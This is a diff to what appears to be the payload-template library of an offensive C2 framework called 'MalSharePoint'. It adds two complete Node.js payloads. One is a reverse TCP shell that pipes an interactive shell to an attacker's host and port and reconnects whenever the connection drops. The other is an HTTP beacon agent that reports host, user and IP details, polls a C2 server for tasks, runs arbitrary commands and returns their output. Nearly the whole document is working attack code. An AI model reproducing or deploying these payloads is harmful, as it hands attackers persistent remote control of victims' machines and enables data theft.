@@ -468,6 +468,172 @@ while True:
 """,
     },
 
+    # ── JavaScript / Node.js ──────────────────────────────────────────
+    {
+        "id": "js_reverse_tcp",
+        "name": "Node.js Reverse Shell (TCP)",
+        "description": "Cross-platform Node.js reverse shell over raw TCP. Requires Node.js on the target (Linux, macOS, Windows).",
+        "platform": "cross-platform",
+        "payload_type": "js",
+        "default_stage_path": "/index.js",
+        "params": ["LHOST", "LPORT"],
+        "content": r"""// --- MalSharePoint Node.js Reverse TCP ---
+'use strict';
+const net  = require('net');
+const {{ spawn }} = require('child_process');
+const os   = require('os');
+
+const HOST           = '{LHOST}';
+const PORT           = {LPORT};
+const RECONNECT_MS   = 5000;
+
+function connect() {{
+  const sock = net.createConnection(PORT, HOST, () => {{
+    const info = `${{os.hostname()}}|${{os.userInfo().username}}|${{os.platform()}} ${{os.release()}}`;
+    sock.write(info + '\n');
+
+    const shell = os.platform() === 'win32' ? 'cmd.exe' : '/bin/sh';
+    const args  = os.platform() === 'win32' ? [] : ['-i'];
+    const proc  = spawn(shell, args);
+
+    sock.pipe(proc.stdin);
+    proc.stdout.pipe(sock);
+    proc.stderr.pipe(sock);
+
+    proc.on('close', () => setTimeout(connect, RECONNECT_MS));
+  }});
+
+  sock.on('error', () => setTimeout(connect, RECONNECT_MS));
+}}
+
+connect();
+""",
+    },
+    {
+        "id": "js_beacon_http",
+        "name": "Node.js HTTP Beacon Agent",
+        "description": "Cross-platform Node.js HTTP beacon agent with full C2 integration. Checkin, task polling, and result reporting.",
+        "platform": "cross-platform",
+        "payload_type": "js",
+        "default_stage_path": "/app.js",
+        "params": ["LHOST", "LPORT", "SLEEP", "JITTER"],
+        "content": r"""// --- MalSharePoint Node.js HTTP Beacon ---
+'use strict';
+const os    = require('os');
+const {{ execSync }} = require('child_process');
+
+const C2             = '{CALLBACK_URL}/api/c2';
+let   SLEEP          = {SLEEP};
+let   JITTER         = {JITTER};
+const UA             = '{UA}';
+const CMD_TIMEOUT_MS = 60000;
+const MAX_OUTPUT     = 8000;
+
+function c2Post(path, body, cb) {{
+  const data = JSON.stringify(body);
+  const url  = new URL(C2 + path);
+  const opts = {{
+    hostname: url.hostname,
+    port: url.port || (url.protocol === 'https:' ? 443 : 80),
+    path: url.pathname + url.search,
+    method: 'POST',
+    headers: {{
+      'Content-Type': 'application/json',
+      'Content-Length': Buffer.byteLength(data),
+      'User-Agent': UA,
+    }},
+  }};
+  const mod = url.protocol === 'https:' ? require('https') : require('http');
+  const req = mod.request(opts, (res) => {{
+    let raw = '';
+    res.on('data', (chunk) => {{ raw += chunk; }});
+    res.on('end', () => {{
+      try {{ cb(null, JSON.parse(raw)); }} catch (e) {{ cb(null, null); }}
+    }});
+  }});
+  req.on('error', () => cb(null, null));
+  req.write(data);
+  req.end();
+}}
+
+function getIp() {{
+  const ifaces = os.networkInterfaces();
+  for (const name of Object.keys(ifaces)) {{
+    for (const iface of ifaces[name]) {{
+      if (!iface.internal && iface.family === 'IPv4') return iface.address;
+    }}
+  }}
+  return '127.0.0.1';
+}}
+
+function sleep(ms) {{
+  return new Promise((resolve) => setTimeout(resolve, ms));
+}}
+
+async function main() {{
+  // Checkin
+  await new Promise((resolve) => {{
+    c2Post('/checkin', {{
+      hostname: os.hostname(),
+      username: os.userInfo().username,
+      os: `${{os.platform()}} ${{os.release()}}`,
+      ip: getIp(),
+      pid: process.pid,
+      arch: os.arch(),
+    }}, (err, reg) => {{
+      if (!reg || !reg.agent_id) process.exit(1);
+      global.agentId = reg.agent_id;
+      resolve();
+    }});
+  }});
+
+  // Beacon loop
+  while (true) {{
+    const jitterMs = Math.random() * SLEEP * (JITTER / 100.0) * 1000;
+    await sleep(SLEEP * 1000 + jitterMs);
+
+    await new Promise((resolve) => {{
+      c2Post('/beacon', {{ agent_id: global.agentId }}, async (err, beacon) => {{
+        if (!beacon || !Array.isArray(beacon.tasks)) return resolve();
+        for (const task of beacon.tasks) {{
+          let output = '', success = true;
+          try {{
+            const cmd = task.command || '';
+            const ttype = task.task_type || 'shell';
+            if (ttype === 'exit') {{
+              c2Post('/result', {{ agent_id: global.agentId, task_id: task.id, output: 'Exiting', success: true }}, () => process.exit(0));
+              return;
+            }} else if (ttype === 'sleep') {{
+              const parts = cmd.trim().split(/\s+/);
+              SLEEP = parseInt(parts[0], 10) || SLEEP;
+              if (parts[1]) JITTER = parseInt(parts[1], 10);
+              output = `Sleep=${{SLEEP}} Jitter=${{JITTER}}`;
+            }} else {{
+              output = execSync(cmd, {{ encoding: 'utf8', timeout: CMD_TIMEOUT_MS, stdio: 'pipe' }});
+            }}
+          }} catch (e) {{
+            output = e.message || String(e);
+            success = false;
+          }}
+          await new Promise((r) => {{
+            c2Post('/result', {{
+              agent_id: global.agentId,
+              task_id: task.id,
+              output: String(output).slice(0, MAX_OUTPUT),
+              success,
+            }}, () => r());
+          }});
+        }}
+        resolve();
+      }});
+    }});
+  }}
+}}
+
+main();
+""",
+    },
+
     # ── Bash / Linux ───────────────────────────────────────────────────
     {
         "id": "sh_reverse_tcp",
